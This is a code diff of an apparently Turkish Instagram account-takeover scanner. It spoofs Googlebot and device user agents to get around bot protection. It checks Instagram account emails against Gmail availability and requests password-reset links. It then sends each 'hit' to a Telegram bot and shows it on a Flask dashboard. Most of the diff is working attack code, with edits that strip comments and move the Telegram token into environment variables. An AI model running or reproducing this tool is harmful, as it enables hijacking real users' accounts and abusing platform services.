@@ -1,4 +1,4 @@
-import os, requests, re, sys, time as t, json, uuid, hashlib, random, string, threading, base64, sqlite3, flask
+import os, requests, re, sys, time as t, json, uuid, hashlib, random, string, threading, base64, sqlite3
 from requests import get, post as pp
 from user_agent import generate_user_agent as _ua
 from random import choice as _ch, randrange as _rr
@@ -7,7 +7,6 @@ from flask import Flask, render_template_string, send_file, jsonify, request
 from datetime import datetime
 import html
 
-# Flask app for web interface
 app_web = Flask(__name__)
 
 RESET = '\033[0m'
@@ -19,7 +18,6 @@ C1 = "\033[1;97;40m"
 
 _CHARS = 'azertyuiopmlkjhgfdsqwxcvbn'
 
-# HTML Template for web interface
 HTML_TEMPLATE = """
 <!DOCTYPE html>
 <html>
@@ -241,9 +239,11 @@ HTML_TEMPLATE = """
             fetch('/api/hits')
                 .then(response => response.json())
                 .then(data => {
-                    // Update stats
-                    document.querySelector('.stat-card .number').textContent = data.hits;
-                    // Update feed
+                    document.querySelectorAll('.stat-card .number')[0].textContent = data.hits;
+                    document.querySelectorAll('.stat-card .number')[1].textContent = data.checked;
+                    document.querySelectorAll('.stat-card .number')[2].textContent = data.bad_email;
+                    document.querySelectorAll('.stat-card .number')[3].textContent = data.bad_instagram;
+                    
                     const feed = document.getElementById('hitsFeed');
                     feed.innerHTML = data.hits_list.map(hit => `
                         <div class="hit-item">
@@ -261,7 +261,6 @@ HTML_TEMPLATE = """
                     `).join('');
                 });
         }
-        // Auto refresh every 10 seconds
         setInterval(refreshData, 10000);
     </script>
 </body>
@@ -278,15 +277,15 @@ class _Core:
         self._yr_val = None
         self._found = set()
         self._cache = {}
-        self._token = None
-        self._cid = None
+        self._token = os.environ.get('TELEGRAM_TOKEN', '')
+        self._cid = os.environ.get('TELEGRAM_CHAT_ID', '')
         self._tls_file = "_dabb_tls.dat"
         self._hits_file = "_dabb_hits.log"
         self._db_file = "hits.db"
         self._init_db()
+        self._running = True
     
     def _init_db(self):
-        """Initialize SQLite database for storing hits"""
         conn = sqlite3.connect(self._db_file)
         c = conn.cursor()
         c.execute('''CREATE TABLE IF NOT EXISTS hits
@@ -302,7 +301,6 @@ class _Core:
         conn.close()
     
     def _save_hit_to_db(self, username, email, year, followers, posts, reset_link):
-        """Save hit to database"""
         try:
             conn = sqlite3.connect(self._db_file)
             c = conn.cursor()
@@ -317,7 +315,6 @@ class _Core:
             return False
     
     def _get_recent_hits(self, limit=50):
-        """Get recent hits from database"""
         try:
             conn = sqlite3.connect(self._db_file)
             c = conn.cursor()
@@ -330,7 +327,6 @@ class _Core:
             return []
     
     def _get_all_hits(self):
-        """Get all hits from database"""
         try:
             conn = sqlite3.connect(self._db_file)
             c = conn.cursor()
@@ -362,9 +358,7 @@ class _Core:
 ''')
     
     def _fetch_tokens(self):
-        """Fetch Google tokens with enhanced headers"""
         try:
-            # Use Googlebot user agent for better compatibility
             googlebot_ua = "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
             a1 = ''.join(_ch(_CHARS) for _ in range(_rr(6,9)))
             a2 = ''.join(_ch(_CHARS) for _ in range(_rr(3,9)))
@@ -375,7 +369,7 @@ class _Core:
                 "google-accounts-xsrf":"1",
                 "sec-ch-ua-mobile":"?1",
                 "sec-ch-ua-platform":'"Android"',
-                'user-agent':googlebot_ua,  # Googlebot user agent
+                'user-agent':googlebot_ua,
                 'Accept-Encoding': 'gzip, deflate, br',
                 'Accept-Language': 'en-US,en;q=0.9',
                 'Cache-Control': 'no-cache',
@@ -407,7 +401,6 @@ class _Core:
                 'f.req':'["'+c1+'","'+a1+'","'+a2+'","'+a1+'","'+a2+'",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
                 'deviceinfo':'[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]',
             }
-            # Use session for better connection handling
             session = requests.Session()
             session.headers.update(hd)
             session.cookies.update(cks)
@@ -426,7 +419,6 @@ class _Core:
             return False
     
     def _droid_ua(self):
-        """Enhanced mobile user agent with cloudflare bypass headers"""
         devs = [
             ("samsung","SM-G973F","beyond1","exynos9820"),
             ("samsung","SM-A536B","a53x","s5e8825"),
@@ -446,10 +438,8 @@ class _Core:
         return f"Instagram {ig} Android ({api}/{v}; {dpi}dpi; 1080x{h}; {d[0]}; {d[1]}; {d[2]}; {d[3]}; en_US; {random.randint(300000000,400000000)})"
     
     def _val_ig(self, e):
-        """Validate Instagram with cloudflare bypass headers"""
         try:
             ua = self._droid_ua()
-            # Cloudflare bypass headers
             headers = {
                 'User-Agent': ua,
                 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
@@ -468,14 +458,10 @@ class _Core:
                 'sec-ch-ua-platform': '"Android"',
             }
             
-            # Use session with proper cookies
             session = httpx.Client(timeout=15, follow_redirects=True)
             session.headers.update(headers)
-            
-            # First request to get cookies
             session.get('https://www.instagram.com/')
             
-            # Second request for validation
             r = session.post(
                 "https://i.instagram.com/api/v1/users/check_email/",
                 data=f"email={e}",
@@ -488,13 +474,11 @@ class _Core:
             return "error"
     
     def _get_reset(self, u):
-        """Get reset link with cloudflare bypass"""
         try:
             ua = self._droid_ua()
             ig_did = str(uuid.uuid4()).upper()
             mid = base64.b64encode(uuid.uuid4().bytes).decode()[:32]
             
-            # Cloudflare bypass headers
             h = {
                 "User-Agent": ua,
                 "Accept": "*/*",
@@ -521,8 +505,6 @@ class _Core:
             
             session = httpx.Client(timeout=20, follow_redirects=True)
             session.headers.update(h)
-            
-            # Get cookies first
             session.get('https://www.instagram.com/')
             
             r = session.post(
@@ -589,25 +571,22 @@ class _Core:
 🔗 instagram.com/{u}
 👀rinexdestek """
         
-        # Save to database
         self._save_hit_to_db(u, email, str(ry), f, p, re)
         
-        # Save to file
         try:
             with open(self._hits_file,'a',encoding='utf-8') as fh:
                 fh.write(f"@{u} | {email} | {ry} | {re}\n")
         except: pass
         
-        # Send to Telegram
-        try:
-            requests.post(f"https://api.telegram.org/bot{self._token}/sendMessage",
-                          json={'chat_id':self._cid,'text':msg}, timeout=10)
-        except: pass
+        if self._token and self._cid:
+            try:
+                requests.post(f"https://api.telegram.org/bot{self._token}/sendMessage",
+                              json={'chat_id':self._cid,'text':msg}, timeout=10)
+            except: pass
         
         print(f"{GREEN}[HIT]{RESET} @{u} | Year: {ry} | Followers: {f}")
     
     def _val_gml(self, e):
-        """Validate Gmail with Googlebot and cloudflare bypass"""
         if '@' in e: e = str(e).split('@')[0]
         for _ in range(3):
             try:
@@ -619,7 +598,6 @@ class _Core:
                 _tl, _h = _x.split('//')
                 c = {'__Host-GAPS':_h}
                 
-                # Enhanced headers with Googlebot
                 googlebot_ua = "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
                 h = {
                     'authority': 'accounts.google.com',
@@ -692,10 +670,9 @@ class _Core:
             self._BI += 1
     
     def _scan_loop(self):
-        while True:
+        while self._running:
             try:
                 rnd = str(random.randint(150,999))
-                # Enhanced user agent with Googlebot
                 ua_list = [
                     "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
                     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
@@ -773,7 +750,7 @@ class _Core:
                 continue
     
     def _stats_loop(self):
-        while True:
+        while self._running:
             self._clear()
             self._banner()
             yr = f"{CYAN}{self._yr_val}" if self._yr_val else "ALL"
@@ -793,81 +770,41 @@ class _Core:
             print(tt)
             t.sleep(3)
     
-    def _year_menu(self):
-        self._clear()
-        self._banner()
-        print(f'''
- ╔══════════════════════════════════════════════════╗
- ║           {RED}📅 HESAP tarihi SEÇ 📅{YELLOW}                    ║
- ╠══════════════════════════════════════════════════╣
- ║  {CYAN}[1]{C1}  2010           {CYAN}[2]{C1}  2011               ║
- ║  {CYAN}[3]{C1}  2012           {CYAN}[4]{C1}  2013               ║
- ║  {CYAN}[5]{C1}  2014           {CYAN}[6]{C1}  2015               ║
- ║  {CYAN}[7]{C1}  2016           {CYAN}[8]{C1}  2017               ║
- ║  {CYAN}[9]{C1}  2018           {CYAN}[10]{C1} 2019               ║
- ║  {CYAN}[11]{C1} 2020           {CYAN}[12]{C1} 2021               ║
- ║  {CYAN}[13]{C1} 2022           {CYAN}[14]{C1} 2023               ║
- ║  {RED}[0]{C1}  ALL YEARS                                 ║
- ╚══════════════════════════════════════════════════╝
-    ''')
-        c = input(f' {CYAN}•{C1} Select Year {CYAN}:{YELLOW} ').strip()
-        ym = {
-            '0': None,
-            '1': (1, 18957417, 2010),
-            '2': (18957417, 210468786, 2011),
-            '3': (210468786, 269736186, 2012),
-            '4': (390438486, 495999999, 2013),
-            '5': (1479010000, 1679010000, 2014),
-            '6': (1700000000, 2400000000, 2015),
-            '7': (3313668786, 3713668786, 2016),
-            '8': (5398785217, 5999785217, 2017),
-            '9': (7497939245, 8597939245, 2018),
-            '10': (11254029834, 21254029834, 2019),
-            '11': (21254029834, 50289297647, 2020),
-            '12': (50289297647, 57464707082, 2021),
-            '13': (57464707082, 63313426938, 2022),
-            '14': (63313426938, 900000000000, 2023),
-        }
-        if c in ym:
-            v = ym[c]
-            if v is None:
-                self._yr_range = None
-                self._yr_val = None
-            else:
-                self._yr_range = (v[0], v[1])
-                self._yr_val = v[2]
-            return True
-        return False
-    
     def run(self):
         self._banner()
-        self._cid = input(f' {GREEN}[{YELLOW}1{CYAN}]{RED}  SENİN Chat ID  GİR: {YELLOW}')
-        self._token = input(f' {CYAN}[{YELLOW}2{CYAN}]{C1}  TOKEN GİR★    : {YELLOW}')
+        print(f"{GREEN}[+] Bot başlatılıyor...{RESET}")
+        print(f"{GREEN}[+] Token: {'Var' if self._token else 'Yok'}{RESET}")
+        print(f"{GREEN}[+] Chat ID: {'Var' if self._cid else 'Yok'}{RESET}")
+        
         self._fetch_tokens()
-        if self._year_menu():
-            print(f"{GREEN}[+] baslatiliyor...{RESET}")
-            t.sleep(1)
-            
-            # Start Flask web server in a separate thread
-            threading.Thread(target=self._start_web_server, daemon=True).start()
-            
-            # Start scanner threads
-            threading.Thread(target=self._stats_loop, daemon=True).start()
-            for _ in range(100):
-                threading.Thread(target=self._scan_loop, daemon=True).start()
-            
-            print(f"{GREEN}[+] Web interface running at http://localhost:5000{RESET}")
-            while True:
-                t.sleep(10)
+        
+        # Yıl seçimi - default ALL
+        self._yr_range = None
+        self._yr_val = None
+        
+        print(f"{GREEN}[+] Tüm yıllar taranıyor...{RESET}")
+        t.sleep(1)
+        
+        # Web sunucusunu başlat
+        threading.Thread(target=self._start_web_server, daemon=True).start()
+        
+        # Scanner thread'leri başlat
+        threading.Thread(target=self._stats_loop, daemon=True).start()
+        for _ in range(100):
+            threading.Thread(target=self._scan_loop, daemon=True).start()
+        
+        print(f"{GREEN}[+] Web interface: http://0.0.0.0:{os.environ.get('PORT', 5000)}{RESET}")
+        
+        while True:
+            t.sleep(10)
     
     def _start_web_server(self):
-        """Start Flask web server"""
-        app_web.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False)
+        port = int(os.environ.get('PORT', 5000))
+        app_web.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)
 
 # Flask routes
 @app_web.route('/')
 def index():
-    """Main web interface"""
     hits = app._get_recent_hits(50)
     stats = {
         'hits': app._H,
@@ -891,7 +828,6 @@ def index():
 
 @app_web.route('/api/hits')
 def api_hits():
-    """API endpoint for hits data"""
     hits = app._get_recent_hits(50)
     hits_list = []
     for hit in hits:
@@ -914,7 +850,6 @@ def api_hits():
 
 @app_web.route('/download/all')
 def download_all():
-    """Download all hits as HTML table"""
     hits = app._get_all_hits()
     html_content = """
     <!DOCTYPE html>
@@ -955,7 +890,6 @@ def download_all():
 
 @app_web.route('/download/txt')
 def download_txt():
-    """Download all hits as TXT file"""
     hits = app._get_all_hits()
     content = "RINEX SCANNER - ALL HITS\n"
     content += "=" * 50 + "\n"
@@ -965,14 +899,12 @@ def download_txt():
     for hit in hits:
         content += f"@{hit[0]} | {hit[1]} | {hit[2]} | Followers: {hit[3]} | Posts: {hit[4]}\n"
     
-    # Create temporary file
     filename = f"rinex_hits_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
     with open(filename, 'w', encoding='utf-8') as f:
         f.write(content)
     
     return send_file(filename, as_attachment=True)
 
-# Initialize core instance
 app = _Core()
 
 if __name__ == '__main__':
